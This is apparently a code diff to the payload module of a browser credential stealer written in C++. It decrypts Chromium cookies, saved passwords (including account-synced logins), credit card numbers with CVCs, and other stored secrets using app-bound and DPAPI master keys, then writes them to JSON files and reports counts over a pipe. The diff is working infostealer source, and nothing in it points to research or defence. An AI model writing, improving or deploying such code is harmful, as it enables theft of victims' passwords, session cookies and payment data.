@@ -16,8 +16,20 @@
 
 namespace Payload {
 
-    DataExtractor::DataExtractor(PipeClient& pipe, const std::vector<std::vector<uint8_t>>& keys, const std::filesystem::path& outputBase, bool isGecko)
+    DataExtractor::DataExtractor(PipeClient& pipe, const MasterKeys& keys, const std::filesystem::path& outputBase, bool isGecko)
         : m_pipe(pipe), m_keys(keys), m_outputBase(outputBase), m_isGecko(isGecko) {}
+
+    std::optional<std::vector<uint8_t>> DataExtractor::DecryptBlob(const std::vector<uint8_t>& encrypted) {
+        if (!m_keys.abe.empty()) {
+            auto dec = Crypto::AesGcm::Decrypt(m_keys.abe, encrypted);
+            if (dec && !dec->empty()) return dec;
+        }
+        if (!m_keys.dpapi.empty()) {
+            auto dec = Crypto::AesGcm::Decrypt(m_keys.dpapi, encrypted);
+            if (dec && !dec->empty()) return dec;
+        }
+        return std::nullopt;
+    }
 
     sqlite3* DataExtractor::OpenDatabase(const std::filesystem::path& dbPath) {
         sqlite3* db = nullptr;
@@ -122,6 +134,10 @@ namespace Payload {
 
         // 1. Cookies (JSON)
         auto cookiePath = profilePath / "Network" / "Cookies";
+        if (!std::filesystem::exists(cookiePath)) {
+            cookiePath = profilePath / "Cookies";
+        }
+
         if (std::filesystem::exists(cookiePath)) {
             if (auto db = OpenDatabaseWithHandleDuplication(cookiePath)) {
                 std::filesystem::create_directories(profileOutDir);
@@ -130,12 +146,22 @@ namespace Payload {
             }
         }
 
-        // 2. Passwords (TXT)
+        // 2. Passwords (JSON)
         auto loginPath = profilePath / "Login Data";
         if (std::filesystem::exists(loginPath)) {
             if (auto db = OpenDatabaseWithHandleDuplication(loginPath)) {
                 std::filesystem::create_directories(profileOutDir);
-                ExtractPasswords(db, profileOutDir / "passwords.txt");
+                ExtractPasswords(db, profileOutDir / "passwords.json");
+                sqlite3_close(db);
+            }
+        }
+
+        // 3. Passwords (Account-Synced)
+        auto loginAccountPath = profilePath / "Login Data For Account";
+        if (std::filesystem::exists(loginAccountPath)) {
+            if (auto db = OpenDatabaseWithHandleDuplication(loginAccountPath)) {
+                std::filesystem::create_directories(profileOutDir);
+                ExtractPasswords(db, profileOutDir / "passwords_account.json");
                 sqlite3_close(db);
             }
         }
@@ -200,16 +226,10 @@ namespace Payload {
             int blobLen = sqlite3_column_bytes(stmt, 6);
             if (blob && blobLen > 0) {
                 std::vector<uint8_t> encrypted((uint8_t*)blob, (uint8_t*)blob + blobLen);
-                bool isV20 = (blobLen > 3 && memcmp(blob, "v20", 3) == 0);
-
-                std::optional<std::vector<uint8_t>> decrypted;
-                for (const auto& key : m_keys) {
-                    decrypted = Crypto::AesGcm::Decrypt(key, encrypted);
-                    if (decrypted && !decrypted->empty()) break;
-                }
+                auto decrypted = DecryptBlob(encrypted);
                 if (decrypted && !decrypted->empty()) {
                     std::string val;
-                    if (isV20 && decrypted->size() > 32) {
+                    if (decrypted->size() > 32) {
                         val = std::string((char*)decrypted->data() + 32, decrypted->size() - 32);
                     } else {
                         val = std::string((char*)decrypted->data(), decrypted->size());
@@ -249,53 +269,54 @@ namespace Payload {
     }
 
     void DataExtractor::ExtractPasswords(sqlite3* db, const std::filesystem::path& outFile) {
-        sqlite3_stmt* stmt;
-        const char* query = "SELECT origin_url, username_value, password_value FROM logins";
-        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) return;
- 
-        std::ofstream out(outFile);
-        out << "================================================================================\n";
-        out << "                                BROWSER PASSWORDS                               \n";
-        out << "================================================================================\n\n";
- 
-        int count = 0;
-        while (sqlite3_step(stmt) == SQLITE_ROW) {
-            const void* blob = sqlite3_column_blob(stmt, 2);
-            int blobLen = sqlite3_column_bytes(stmt, 2);
-            if (blob && blobLen > 0) {
-                std::vector<uint8_t> encrypted((uint8_t*)blob, (uint8_t*)blob + blobLen);
-                bool isV20 = (blobLen > 3 && memcmp(blob, "v20", 3) == 0);
-                
-                std::optional<std::vector<uint8_t>> decrypted;
-                for (const auto& key : m_keys) {
-                    decrypted = Crypto::AesGcm::Decrypt(key, encrypted);
-                    if (decrypted && !decrypted->empty()) break;
-                }
- 
-                if (decrypted && !decrypted->empty()) {
-                    std::string val;
-                    // Pro-grade truncation: only skip 32 bytes if it's confirmed V20 ABE data
-                    if (isV20 && decrypted->size() > 32) {
-                        val = std::string((char*)decrypted->data() + 32, decrypted->size() - 32);
-                    } else {
-                        val = std::string((char*)decrypted->data(), decrypted->size());
+        auto processTable = [&](const char* tableName) -> int {
+            sqlite3_stmt* stmt;
+            std::string q = "SELECT origin_url, username_value, password_value FROM " + std::string(tableName);
+            if (sqlite3_prepare_v2(db, q.c_str(), -1, &stmt, nullptr) != SQLITE_OK) return -1;
+
+            int tableCount = 0;
+            std::vector<std::string> entries;
+            while (sqlite3_step(stmt) == SQLITE_ROW) {
+                const void* blob = sqlite3_column_blob(stmt, 2);
+                int blobLen = sqlite3_column_bytes(stmt, 2);
+                if (blob && blobLen > 0) {
+                    std::vector<uint8_t> encrypted((uint8_t*)blob, (uint8_t*)blob + blobLen);
+                    auto decrypted = DecryptBlob(encrypted);
+                    if (decrypted && !decrypted->empty()) {
+                        std::string val((char*)decrypted->data(), decrypted->size());
+                        std::stringstream ss;
+                        ss << "{\"url\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 0)) << "\","
+                           << "\"user\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 1)) << "\","
+                           << "\"pass\":\"" << EscapeJson(val) << "\"}";
+                        entries.push_back(ss.str());
+                        tableCount++;
+                    } else if (tableCount == 0) {
+                        char header[12] = {0};
+                        for (int i = 0; i < (std::min)(4, blobLen); ++i) sprintf(header + i*2, "%02X", ((uint8_t*)blob)[i]);
+                        m_pipe.LogDebug("Decryption failed for " + std::string(tableName) + ". Header: " + header);
                     }
- 
-                    const char* url_text = (const char*)sqlite3_column_text(stmt, 0);
-                    const char* user_text = (const char*)sqlite3_column_text(stmt, 1);
-                    std::string url = url_text ? url_text : "N/A";
-                    std::string user = user_text ? user_text : "N/A";
- 
-                    out << "URL:      " << url << "\n"
-                        << "User:     " << user << "\n"
-                        << "Password: " << val << "\n"
-                        << "--------------------------------------------------------------------------------\n";
-                    count++;
                 }
             }
+            sqlite3_finalize(stmt);
+            
+            if (!entries.empty()) {
+                std::filesystem::create_directories(outFile.parent_path());
+                std::ofstream out(outFile);
+                out << "[\n";
+                for (size_t i = 0; i < entries.size(); ++i) {
+                    out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
+                }
+                out << "]";
+            }
+            return tableCount;
+        };
+
+        int res = processTable("logins");
+        if (res <= 0) res = processTable("account_logins");
+
+        if (res > 0) {
+            m_pipe.Log("PASSWORDS:" + std::to_string(res));
         }
-        sqlite3_finalize(stmt);
-        m_pipe.Log("PASSWORDS_EXTRACTED:" + std::to_string(count));
     }
 
     void DataExtractor::ExtractCards(sqlite3* db, const std::filesystem::path& outFile) {
@@ -309,12 +330,8 @@ namespace Payload {
                 int len = sqlite3_column_bytes(stmt, 1);
                 if (guid && blob && len > 0) {
                     std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
-                    std::optional<std::vector<uint8_t>> dec;
-                    for (const auto& key : m_keys) {
-                        dec = Crypto::AesGcm::Decrypt(key, enc);
-                        if (dec && !dec->empty()) break;
-                    }
-                    if (dec && !dec->empty()) cvcMap[guid] = std::string((char*)dec->data(), dec->size());
+                    auto dec = DecryptBlob(enc);
+                    if (dec) cvcMap[guid] = std::string((char*)dec->data(), dec->size());
                 }
             }
             sqlite3_finalize(stmt);
@@ -336,12 +353,8 @@ namespace Payload {
             
             if (blob && len > 0) {
                 std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
-                std::optional<std::vector<uint8_t>> dec;
-                for (const auto& key : m_keys) {
-                    dec = Crypto::AesGcm::Decrypt(key, enc);
-                    if (dec && !dec->empty()) break;
-                }
-                if (dec && !dec->empty()) {
+                auto dec = DecryptBlob(enc);
+                if (dec) {
                     std::string num((char*)dec->data(), dec->size());
                     std::string cvc = (guid && cvcMap.count(guid)) ? cvcMap[guid] : "N/A";
                     const char* name_text = (const char*)sqlite3_column_text(stmt, 1);
@@ -373,12 +386,8 @@ namespace Payload {
             
             if (blob && len > 0) {
                 std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
-                std::optional<std::vector<uint8_t>> dec;
-                for (const auto& key : m_keys) {
-                    dec = Crypto::AesGcm::Decrypt(key, enc);
-                    if (dec && !dec->empty()) break;
-                }
-                if (dec && !dec->empty()) {
+                auto dec = DecryptBlob(enc);
+                if (dec) {
                     std::string val((char*)dec->data(), dec->size());
                     std::stringstream ss;
                     ss << "{\"nickname\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 1)) << "\","
@@ -415,12 +424,8 @@ namespace Payload {
             
             if (blob && len > 0) {
                 std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
-                std::optional<std::vector<uint8_t>> dec;
-                for (const auto& key : m_keys) {
-                    dec = Crypto::AesGcm::Decrypt(key, enc);
-                    if (dec && !dec->empty()) break;
-                }
-                if (dec && !dec->empty()) {
+                auto dec = DecryptBlob(enc);
+                if (dec) {
                     std::string val((char*)dec->data(), dec->size());
                     std::string bindingKey = "";
                     
@@ -429,12 +434,8 @@ namespace Payload {
                         int bKeyLen = sqlite3_column_bytes(stmt, 2);
                         if (bKeyBlob && bKeyLen > 0) {
                             std::vector<uint8_t> encKey((uint8_t*)bKeyBlob, (uint8_t*)bKeyBlob + bKeyLen);
-                            std::optional<std::vector<uint8_t>> decKey;
-                            for (const auto& key : m_keys) {
-                                decKey = Crypto::AesGcm::Decrypt(key, encKey);
-                                if (decKey && !decKey->empty()) break;
-                            }
-                            if (decKey && !decKey->empty()) {
+                            auto decKey = DecryptBlob(encKey);
+                            if (decKey) {
                                 bindingKey = std::string((char*)decKey->data(), decKey->size());
                             }
                         }
